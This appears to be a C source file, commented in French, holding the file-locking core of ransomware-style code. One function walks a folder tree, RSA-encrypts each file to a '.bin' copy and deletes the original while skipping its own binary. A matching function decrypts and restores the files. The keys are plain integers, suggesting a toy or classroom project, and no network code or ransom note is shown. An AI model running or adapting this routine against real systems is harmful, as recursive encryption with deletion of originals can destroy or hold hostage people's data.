#include "config.h"
#include "rsa.h"
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>

// Chiffrement récursif d'un dossier
void chiffrer_dossier(const char *path, int e, int n) {
  DIR *dir = opendir(path);
  if (!dir)
    return; // si dossier invalide

  struct dirent *entry;
  char input_path[512];
  char output_path[512];

  while ((entry = readdir(dir)) != NULL) {

    // Ignorer . et ..
    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
      continue;

    // Ignorer le binaire
    if (strcmp(entry->d_name, NAME_BUILD) == 0)
      continue;

    // Ignorer fichiers déjà traités
    if (strstr(entry->d_name, IGNORE_EXT_BIN) ||
        strstr(entry->d_name, IGNORE_EXT_DEC))
      continue;

    // Construire le chemin complet
    snprintf(input_path, sizeof(input_path), "%s/%s", path, entry->d_name);

    struct stat st;
    stat(input_path, &st);

    if (S_ISDIR(st.st_mode)) {
      chiffrer_dossier(input_path, e, n);
    } else {
      // Créer le fichier de sortie
      snprintf(output_path, sizeof(output_path), "%s.bin", input_path);

      // Chiffrer le fichier
      chiffrer_fichier(input_path, output_path, e, n);
      printf("Chiffre: %s -> %s\n", input_path, output_path);

      // Supprimer le fichier original
      if (remove(input_path) == 0) {
        printf("Supprime original: %s\n", input_path);
      } else {
        perror("Erreur suppression");
      }
    }
  }

  closedir(dir);
}

// Déchiffrement récursif d'un dossier
void dechiffrer_dossier(const char *path, int d, int n) {
  DIR *dir = opendir(path);
  if (!dir)
    return; // si dossier invalide

  struct dirent *entry;
  char input_path[512];
  char output_path[512];

  while ((entry = readdir(dir)) != NULL) {

    // Ignorer . et ..
    if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
      continue;

    // Ignorer le binaire
    if (strcmp(entry->d_name, NAME_BUILD) == 0)
      continue;

    // Construire le chemin complet
    snprintf(input_path, sizeof(input_path), "%s/%s", path, entry->d_name);

    struct stat st;
    stat(input_path, &st);

    if (S_ISDIR(st.st_mode)) {
      dechiffrer_dossier(input_path, d, n);
    } else {
      // Ne traiter que les fichiers .bin
      if (!strstr(entry->d_name, IGNORE_EXT_BIN))
        continue;

      // Copier le nom et retirer .bin
      strncpy(output_path, input_path, sizeof(output_path));
      output_path[sizeof(output_path) - 1] = '\0';

      // Enlever ".bin"
      char *ext = strstr(output_path, IGNORE_EXT_BIN);
      if (ext) {
        *ext = '\0';
      }

      // Déchiffrement vers fichier original
      dechiffrer_fichier(input_path, output_path, d, n);
      printf("Dechiffre: %s -> %s\n", input_path, output_path);

      // Supprimer le fichier .bin
      if (remove(input_path) == 0) {
        printf("Supprime chiffre: %s\n", input_path);
      } else {
        perror("Erreur suppression");
      }
    }
  }

  closedir(dir);
}
